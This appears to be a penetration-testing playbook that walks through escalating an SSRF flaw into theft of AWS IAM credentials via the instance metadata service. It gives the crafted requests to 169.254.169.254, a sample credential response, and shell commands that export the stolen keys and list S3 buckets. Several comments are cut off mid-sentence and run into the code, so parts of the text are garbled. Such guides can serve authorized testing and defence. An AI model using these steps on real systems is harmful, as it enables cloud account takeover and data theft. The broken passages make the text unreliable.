# SSRF to AWS Metadata Abuse

## When to Use
- When you discover an SSRF vulnerability (a feature that fetches external URLs based on user input) in an application that you suspect or know is hosted on Amazon Web Services (AWS).
- To demonstrate the critical impact of SSRF by escalating from a web vulnerability to full cloud environment compromise via IAM credential theft.


## Prerequisites
- Authorized scope and rules of engagement for the target environment
- Appropriate tools installed on the attack/analysis platform
- Understanding of the target technology stack and architecture
- Documentation template ready for findings and evidence capture

## Workflow

### Phase 1: Identifying SSRF

```text
# Concept: The application takes a URL ```

### Phase 2: Querying the AWS IMDS (Instance Metadata Service)

```http
# Concept: AWS instances 1. IMDSv1 (The older, easily exploitable POST /api/fetch-image HTTP/1.1
Host: target.com
{"url": "http://169.254.169.254/latest/meta-data/"}

# Target POST /api/fetch-image HTTP/1.1
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

# Response HTTP/1.1 200 OK
ec2-role-name
```

### Phase 3: Stealing IAM Credentials

```http
# 1. Fetch POST /api/fetch-image HTTP/1.1
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role-name"}

# Response {
  "Code" : "Success",
  "LastUpdated" : "2023-10-27T01:02:03Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA...",
  "SecretAccessKey" : "...",
  "Token" : "IQoJb3JpZ2lu...",
  "Expiration" : "2023-10-27T07:15:30Z"
}
```

### Phase 4: Abusing the Credentials

```bash
# export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="IQoJb3JpZ2lu..."

# aws sts get-caller-identity
aws s3 ls
```
